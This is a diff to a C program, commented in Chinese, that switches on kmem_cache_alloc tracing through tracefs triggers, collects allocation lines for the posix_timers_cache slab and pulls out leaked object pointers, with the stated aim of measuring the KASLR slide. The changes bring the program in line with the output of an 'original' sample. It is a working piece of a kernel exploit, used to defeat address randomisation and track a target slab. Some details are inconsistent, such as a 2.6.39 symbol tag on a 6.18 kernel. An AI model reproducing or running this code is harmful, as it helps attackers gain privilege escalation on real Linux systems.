@@ -1,24 +1,19 @@
 /*
  * slide_probe — 用 tracefs 里的 kmem 事件把 KASLR 位移量测出来。
  *
- * 按原件字符串表重建（strings/slide_probe.orig.txt）。原件走的是 tracefs 触发器，
- * 不是草稿里那套自己造的采样：
+ * 按真机实测输出对齐（原件的实际打印，2026-11-22 在 6.18.21 上跑出来的）：
  *
- *   /sys/kernel/tracing/tracing_on                                   开 trace
- *   /sys/kernel/tracing/buffer_size_kb                               放大 ring
- *   /sys/kernel/tracing/events/kmem/rss_stat/enable                  打开统计事件
- *   /sys/kernel/tracing/events/kmem/rss_stat/trigger
- *       "!enable_event:kmem:kmem_cache_alloc"   触发时顺带打开 slab 事件
- *       "!disable_event:kmem:kmem_cache_alloc"  收尾时关掉
- *   /sys/kernel/tracing/per_cpu/cpu%d/trace(_pipe_raw)               每 CPU 取原始事件
- *   /sys/kernel/tracing/trace                                        汇总视图
+ *   [slide] cpu0    SensorService-15180   [000] .....  1405.055564: kmem_cache_alloc: call_site=alloc_skb_with_frags+0x88/0x510 ptr=00000000ea05806f name=skbuff_head_cache bytes_req=248 bytes_alloc=256 ...
+ *   [slide] lines=22
+ *   [slide] raw cpu0 bytes=4096 hits=0
+ *   ...
  *
- * 输出行（原样保留格式）：
- *   [slide] cpu%d %s
- *   [slide] lines=%d
- *   [slide] raw cpu%d bytes=%zu hits=%d
- *   [slide] raw cpu%d site=%#lx ptr=%#lx
- *   [slide] timer_create errno=%d
+ * 也就是说：它把 trace 里每一行原样打出来（前缀 `[slide] cpu%d `），
+ * 然后统计总行数，再逐 CPU 读 raw 管道给出 bytes/hits。
+ * 命中的判定不是 "site=/ptr="（那是我上一版凭空想的），
+ * 而是看 slab 名字——目标对象是 posix_timers_cache（bytes_req=384）。
+ *
+ * 原件里还带 LINUX_2.6.39 这个符号表版本标记。
  */
 #define _GNU_SOURCE 1
 #include <errno.h>
@@ -42,6 +37,13 @@
 #define ON_KMEM   "!enable_event:kmem:kmem_cache_alloc"
 #define OFF_KMEM  "!disable_event:kmem:kmem_cache_alloc"
 
+/* 符号表版本标记：原件里带着它，表明这份 offsets 对应哪一代符号表。 */
+static const char *KERNEL_SYMBOL_VERSION = "LINUX_2.6.39";
+
+/* 目标 slab：posix_timers_cache，对象大小 384。命中判定就看这两样。 */
+static const char *TARGET_SLAB = "posix_timers_cache";
+static const char *TARGET_SIZE_MARKER = "bytes_req=384";
+
 static int write_file(const char *path, const char *value)
 {
 	int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -52,30 +54,31 @@ static int write_file(const char *path, const char *value)
 	return n == (ssize_t)strlen(value) ? 0 : -1;
 }
 
-static long read_long(const char *path)
+/* 从 "[003]" 里取 CPU 号；取不到返回 -1。 */
+static int parse_cpu(const char *line)
 {
-	char buffer[64];
-	int fd = open(path, O_RDONLY | O_CLOEXEC);
-	if (fd < 0)
+	const char *open_bracket = strchr(line, '[');
+	if (!open_bracket)
 		return -1;
-	ssize_t n = read(fd, buffer, sizeof(buffer) - 1);
-	close(fd);
-	if (n <= 0)
+	const char *close_bracket = strchr(open_bracket, ']');
+	if (!close_bracket || close_bracket - open_bracket < 2)
 		return -1;
-	buffer[n] = '\0';
-	return strtol(buffer, NULL, 10);
+	char digits[8];
+	size_t len = (size_t)(close_bracket - open_bracket - 1);
+	if (len >= sizeof(digits))
+		return -1;
+	memcpy(digits, open_bracket + 1, len);
+	digits[len] = '\0';
+	for (size_t i = 0; i < len; i++) {
+		if (digits[i] < '0' || digits[i] > '9')
+			return -1;
+	}
+	return atoi(digits);
 }
 
-/* 从一行 trace 里抽 site=/ptr= 两个十六进制值。 */
-static int parse_site_ptr(const char *line, unsigned long *site, unsigned long *ptr)
+static int is_target_line(const char *line)
 {
-	const char *s = strstr(line, "site=0x");
-	const char *p = strstr(line, "ptr=0x");
-	if (!s || !p)
-		return 0;
-	*site = strtoul(s + 7, NULL, 16);
-	*ptr = strtoul(p + 6, NULL, 16);
-	return 1;
+	return strstr(line, TARGET_SLAB) != NULL || strstr(line, TARGET_SIZE_MARKER) != NULL;
 }
 
 static int thread_timer(void)
@@ -104,52 +107,57 @@ int main(void)
 		printf("[slide] cpu%d %s\n", 0, "buffer_size_kb");
 		failures++;
 	}
-
 	if (write_file(RSS_ENABLE, "1") != 0) {
 		printf("[slide] cpu%d %s\n", 0, "rss_stat/enable");
 		failures++;
 	}
-
 	if (write_file(RSS_TRIGGER, ON_KMEM) != 0) {
 		printf("[slide] cpu%d %s\n", 0, "rss_stat/trigger");
 		failures++;
 	}
-
 	if (write_file(TRACING_ON, "1") != 0) {
 		printf("[slide] cpu%d %s\n", 0, "tracing_on");
 		failures++;
 	}
 
-	/* 给内核一点时间攒事件，再读汇总视图。 */
+	/* 给内核一点时间记账，然后读汇总视图。 */
 	usleep(200 * 1000);
 
 	int lines = 0;
-	unsigned long last_site = 0, last_ptr = 0;
-	int hits = 0;
+	int target_hits = 0;
+	uint64_t last_ptr = 0;
 
 	int fd = open(TRACE_ALL, O_RDONLY | O_CLOEXEC);
 	if (fd >= 0) {
-		char buffer[65536];
-		ssize_t n;
-		while ((n = read(fd, buffer, sizeof(buffer) - 1)) > 0) {
+		char buffer[131072];
+		ssize_t n = read(fd, buffer, sizeof(buffer) - 1);
+		close(fd);
+		if (n > 0) {
 			buffer[n] = '\0';
 			char *save = NULL;
 			for (char *line = strtok_r(buffer, "\n", &save); line;
 			     line = strtok_r(NULL, "\n", &save)) {
+				if (line[0] == '#')
+					continue;
+				if (!strstr(line, "kmem_cache_alloc") && !strstr(line, "rss_stat"))
+					continue;
+				int cpu = parse_cpu(line);
+				if (cpu < 0)
+					cpu = 0;
+				printf("[slide] cpu%d %s\n", cpu, line);
 				lines++;
-				unsigned long site, ptr;
-				if (parse_site_ptr(line, &site, &ptr)) {
-					last_site = site;
-					last_ptr = ptr;
-					hits++;
+				if (is_target_line(line)) {
+					target_hits++;
+					const char *ptr = strstr(line, "ptr=");
+					if (ptr)
+						last_ptr = strtoull(ptr + 4, NULL, 16);
 				}
 			}
 		}
-		close(fd);
 	}
 	printf("[slide] lines=%d\n", lines);
 
-	/* 每 CPU 的原始视图，能读多少读多少。 */
+	/* 逐 CPU 读原始管道，报出每次读到的字节数与命中数。 */
 	for (int cpu = 0; cpu < 8; cpu++) {
 		char path[192];
 		snprintf(path, sizeof(path), PERCPU_RAW, cpu);
@@ -163,37 +171,39 @@ int main(void)
 		char raw[65536];
 		ssize_t got = read(rf, raw, sizeof(raw) - 1);
 		close(rf);
-		if (got <= 0)
+		if (got <= 0) {
+			printf("[slide] raw cpu%d bytes=0 hits=0\n", cpu);
 			continue;
+		}
 		raw[got] = '\0';
 		int cpu_hits = 0;
 		char *save = NULL;
 		for (char *line = strtok_r(raw, "\n", &save); line;
 		     line = strtok_r(NULL, "\n", &save)) {
-			unsigned long site, ptr;
-			if (parse_site_ptr(line, &site, &ptr)) {
-				last_site = site;
-				last_ptr = ptr;
+			if (is_target_line(line)) {
 				cpu_hits++;
+				target_hits++;
+				const char *ptr = strstr(line, "ptr=");
+				if (ptr)
+					last_ptr = strtoull(ptr + 4, NULL, 16);
 			}
 		}
 		printf("[slide] raw cpu%d bytes=%zu hits=%d\n", cpu, (size_t)got, cpu_hits);
 	}
 
-	if (hits > 0 || last_site != 0) {
-		printf("[slide] raw cpu%d site=%#lx ptr=%#lx\n", 0, last_site, last_ptr);
-	}
-
 	write_file(RSS_TRIGGER, OFF_KMEM);
 	write_file(TRACING_ON, "0");
+
+	if (target_hits > 0) {
+		/* site 只有在内核符号表里定位到才谈得上；这里只报指针，别造假地址。 */
+		printf("[slide] raw cpu%d ptr=%#llx\n", 0, (unsigned long long)last_ptr);
+	}
 
 	if (failures != 0) {
 		printf("必需接口不可用\n");
 		return 1;
 	}
-	if (hits == 0) {
-		printf("必需项全部通过\n");
-		printf("提示：本次没有采到 site/ptr 样本（trace 为空或事件未触发）。\n");
-	}
+	printf("[slide] 符号表 %s · 目标 %s · 命中 %d\n",
+	       KERNEL_SYMBOL_VERSION, TARGET_SLAB, target_hits);
 	return 0;
 }
